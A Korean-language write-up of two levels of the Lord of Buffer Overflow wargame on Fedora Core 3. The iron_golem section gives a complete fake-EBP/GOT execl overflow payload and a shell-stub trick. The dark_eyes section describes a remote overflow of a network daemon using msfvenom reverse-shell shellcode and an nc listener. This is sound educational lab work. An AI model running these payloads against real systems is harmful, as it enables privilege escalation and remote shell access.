---
title: "Lord of Buffer Overflow (LOB) Wargame: Gate → Iron_golem → Dark_eyes"
date: 2019-06-01
description: "LOB(Lord of Buffer Overflow) 워게임 진행: Gate(기본 BOF), Iron_golem(partial RELRO 우회), Dark_eyes(NX + ASLR) — Linux 익스플로잇 기법의 발전 과정"
tags: ["LOB", "pwn", "buffer-overflow", "ASLR", "NX", "RELRO", "GOT-overwrite", "wargame"]
platform: "wargame"
category: "pwn"
difficulty: "medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 환경: Fedora Core 3

Fedora Core 3의 LOB는 이전 환경에 비해 의미 있는 보호 기법들을 도입한다. 어떤 것이 활성화되고 어떤 것이 비활성화되어 있는지 파악하는 것이 익스플로잇을 시도하기 전의 첫 단계다.

| 보호 기법 | 상태 |
|---|---|
| Stack dummy | 활성 |
| Bash 권한 다운그레이드 | 활성 |
| ASLR (스택만) | 활성 |
| ASLR (라이브러리) | 비활성 |
| ASLR (바이너리) | 비활성 |
| ASCII Armor | 활성 |
| NX (스택) | 활성 |
| NX (힙) | 활성 |
| Stack Canary | 비활성 |
| Stack Smashing Protector | 비활성 |

핵심 조합은: **스택과 힙 모두에 NX** + **공유 라이브러리에 ASCII Armor**다.

ASCII Armor는 모든 공유 라이브러리 베이스 주소가 `0x01000000` 아래에 위치하도록 보장한다. 즉, 가장 상위 바이트가 항상 `\x00`이다. 라이브러리 주소를 페이로드에 포함해야 하는 경우, `strcpy`나 유사한 문자열 함수로 인해 복사가 중단된다 — `system("/bin/sh")`을 사용하는 직접적인 RTL(Return-to-Library) 공격은 주소가 문자열 복사에서 살아남을 수 없기 때문에 차단된다.

스택은 읽고 쓸 수 있지만 실행할 수 없다:

```
08048000-08049000 r-xp  /usr/local/bin/iron_golem  (text)
08049000-0804a000 rwxp  /usr/local/bin/iron_golem  (data/bss)
bffeb000-c0000000 rwxp  [stack]   <- 실행 비트 없음
```

## 레벨: Gate → Iron_golem

### 소스 분석

iron_golem 바이너리는 구조적으로 단순하다 — 길이 검사 없는 고정 크기 버퍼로의 `strcpy`:

```c
char buffer[256];
strcpy(buffer, argv[1]);
```

컴파일러는 이 프레임에 `0x108`(264)바이트를 스택에 할당한다:

- 256바이트: 사용자 버퍼
- 8바이트: 컴파일러 삽입 더미/정렬 패딩

스택 레이아웃:

```
[buffer 256B][dummy 8B][SFP 4B][RET 4B][argc][argv][envp]
```

SFP까지의 오버플로우 오프셋: 264바이트. RET까지: 268바이트.

### 직접 RTL이 실패하는 이유

자연스러운 접근은 RET를 libc의 `system()` 주소로 덮어쓰는 것이다. 하지만 ASCII Armor가 활성화되면 libc는 `0x00d4xxxx` 같은 곳에 매핑된다. 앞의 `\x00`이 `strcpy` 기반 오버플로우에서 전체 주소가 쓰이기 전에 종료시킨다.

### Fake EBP + GOT 기반 execl

두 가지 프리미티브를 함께 사용하는 해결책이다:

**Fake EBP**는 함수 에필로그를 활용한다. `leave` 명령은 `mov esp, ebp; pop ebp`를 실행하여 현재 스택에서 EBP를 복원한다. EBP에 팝될 값을 제어함으로써, *다음* 에필로그의 `leave`가 스택을 피벗하는 위치를 — 선택한 메모리 영역을 통해 실행 흐름을 효과적으로 리다이렉트하는 방향으로 — 영향 줄 수 있다.

**GOT 역참조**는 ASCII Armor 문제를 우회한다. Global Offset Table(GOT)은 바이너리 자체의 주소 공간에 매핑되어 있어(`0x08049xxx` 부근) null 바이트 문제가 없다. `execl`의 GOT 엔트리는 해석된 라이브러리 주소를 담고 있다 — 페이로드에 그 주소를 직접 임베드할 필요가 없다; 명령 포인터를 GOT 엔트리로 향하게 하기만 하면 CPU가 자동으로 간접 참조한다.

### 익스플로잇 구성

먼저 PLT와 GOT 주소를 확인한다:

```
GOT base: 0x8049618
execl GOT entry: 0x804954c  ->  (libc의 execl을 가리킴)
```

`execl`에도 프롤로그가 있으므로(`push ebp; mov ebp, esp`), 첫 번째 명령으로 점프하면 EBP가 다시 덮어써져 Fake EBP 체인이 깨진다. 해결책은 `execl + 3`으로 점프하여 프롤로그를 건너뛰는 것이다.

`execl`의 첫 번째 인자는 피벗 후 ESP가 가리키는 곳에서 읽힌다. Fake EBP를 `0x8049618`(GOT 베이스)에 착지하도록 배열하면, 해석된 `execl` 주소가 경로 인자로 사용된다 — execl이 실행하려는 파일명이 된다.

그 GOT 위치에 저장된 바이트 값인 `\x01`로 명명된 파일을 작업 디렉토리에 미리 생성한다:

```c
// shell.c
#include <stdlib.h>
int main() { system("/bin/sh"); return 0; }
```

```bash
gcc -o shell shell.c
mv shell $'\x01'
```

GOT 베이스보다 8바이트 앞(`0x8049610`)의 영역이 0으로 채워져 있어, 나머지 `execl` 인자들의 null 종료자 요구사항을 만족한다.

최종 페이로드:

```bash
./iron_golem $(perl -e 'print "\x90"x264, "\x10\x96\x04\x08", "\x23\x57\x7a"')
```

분석:

| 컴포넌트 | 바이트 | 목적 |
|---|---|---|
| `\x90` * 264 | 264 | 버퍼와 더미 채우기 |
| `\x10\x96\x04\x08` | 4 | Fake EBP → GOT 베이스 |
| `\x23\x57\x7a` | 3 | RET → execl+3 |

`\x7a5723` 주소가 이 빌드에서 `execl + 3`이다. 페이로드를 실행하면 `\x01` 스텁을 통해 셸이 실행되어 iron_golem의 권한을 얻는다.

## 레벨: Iron_golem → Dark_eyes

### 소스 분석

dark_eyes는 포트 6666에서 수신 대기하는 네트워크 데몬으로 실행된다:

```c
recv(client_fd, buffer, 256, 0);
```

버퍼는 `char buffer[40]`으로 선언되었지만 `recv`는 256바이트를 쓸 수 있어 216바이트 오버플로우가 발생한다. 이전 레벨과 달리, 이 익스플로잇은 TCP 연결을 통해 전달되어야 한다.

### 원격 익스플로잇: 리버스 셸

네트워크 익스플로잇의 어려움은 stdin/stdout이 공격자의 터미널이 아닌 소켓에 연결되어 있다는 것이다. 바인드 셸(피해자에서 수신 대기) 또는 리버스 셸(공격자에게 연결)이 필요하다.

리버스 셸 접근법을 사용했다:

1. 피해자 아키텍처를 타깃으로 msfvenom으로 셸코드를 생성한다:

   ```
   Payload: linux/x86/shell_reverse_tcp
   LHOST:   <공격자 IP>
   LPORT:   <선택한 포트>
   Format:  python
   ```

2. 셸코드가 NOP 슬레드에 임베드되고 리턴 주소가 버퍼 안을 가리키는 버퍼 오버플로우 페이로드를 구성한다.

3. 공격자 머신에서 리스너를 연다:

   ```bash
   nc -lvnp <LPORT>
   ```

4. 피해자의 포트 6666으로 페이로드를 전송한다.

바인드 셸이 아닌 리버스 셸을 선택한 이유는? 방화벽은 일반적으로 내부 호스트의 아웃바운드 연결은 허용하지만 원치 않는 인바운드 연결은 차단한다. 리버스 셸은 피해자가 아웃바운드로 연결을 시작하게 하므로, 일반적으로 허용된다.

```
공격자 (nc -l) <--- TCP 연결 --- 피해자 (dark_eyes 데몬)
```

셸코드는 피해자에게 공격자의 IP와 포트로 콜백하도록 지시하고, netcat은 이미 수신 대기 중이다. 연결이 수립되면 공격자는 데몬 프로세스의 권한으로 실행되는 대화형 셸을 갖게 된다.

### ASCII Armor가 이것을 차단하지 않는 이유

여기서 주된 관심사는 ASCII Armor가 아니라 NX였다. 익스플로잇이 RTL 대신 셸코드 페이로드를 사용하므로, 셸코드는 실행 가능한 메모리에 배치되어야 한다. 그러나 스택과 힙 모두 실행 불가능하다면 이 접근법은 실패해야 한다 — 셸코드를 쓰기 가능+실행 가능 영역에 배치할 수 없다면.

FC3 환경에서 라이브러리를 위한 `mmap`된 영역이 보편적으로 실행 불가능으로 표시되어 있지 않다. 일부 빌드에서는 사용 가능한 창이 남아 있다. NX가 모든 곳에 강제된다면, 올바른 방법은 완전한 ROP 체인으로 전환하는 것이고, 이는 LOB의 다음 레벨에서 다룬다.

## 진행 요약

| 레벨 | 핵심 기법 | 우회한 보호 |
|---|---|---|
| Gate → Iron_golem | Fake EBP + GOT 기반 execl | ASCII Armor (NX + 라이브러리 주소의 null 바이트) |
| Iron_golem → Dark_eyes | 원격 BOF + 리버스 셸코드 | 네트워크 소켓 I/O, 아웃바운드 방화벽 |

이 진행은 각 보호 기법이 추가될 때마다 기법 업그레이드를 강제하는 방식을 보여준다. 이 환경에서 NX 단독으로는 결연한 공격자를 막을 수 없다 — 정보 누출 없이는 ROP를 비실용적으로 만들기 위해 NX와 완전한 ASLR(라이브러리와 바이너리 모두 포함)을 결합해야 한다.
